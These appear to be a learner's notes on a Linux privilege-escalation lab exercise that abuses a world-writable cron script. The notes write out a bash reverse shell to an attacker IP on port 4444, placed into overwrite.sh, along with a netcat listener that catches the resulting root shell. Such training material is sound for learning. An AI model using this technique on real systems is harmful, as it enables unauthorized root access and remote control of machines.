Cron jobs are programs or scripts which users can schedule to run at specific times or intervals. Cron table files (crontabs) store the configuration for cron jobs. The system-wide crontab is located at /etc/crontab.

View the contents of the system-wide crontab:

`cat /etc/crontab`

![[Pasted image 20240222224446.png]]

There should be two cron jobs scheduled to run every minute. One runs overwrite.sh, the other runs /usr/local/bin/compress.sh.

Locate the full path of the overwrite.sh file:

`locate overwrite.sh`

![[Pasted image 20240222225445.png]]

Note that the file is world-writable:

`ls -l /usr/local/bin/overwrite.sh`

![[Pasted image 20240222225524.png]]

Replace the contents of the overwrite.sh file with the following after changing the IP address to that of your Kali box.

#!/bin/bash  
bash -i >& /dev/tcp/10.10.10.10/4444 0>&1

![[Pasted image 20240222225834.png]]

![[Pasted image 20240222225808.png]]


Set up a netcat listener on your Kali box on port 4444 and wait for the cron job to run (should not take longer than a minute). A root shell should connect back to your netcat listener. If it doesn't recheck the permissions of the file, is anything missing?

`nc -nvlp 4444`

![[Pasted image 20240222225934.png]]

Remember to exit out of the root shell and remove the reverse shell code before continuing!  

Answer the questions below

Read and follow along with the above.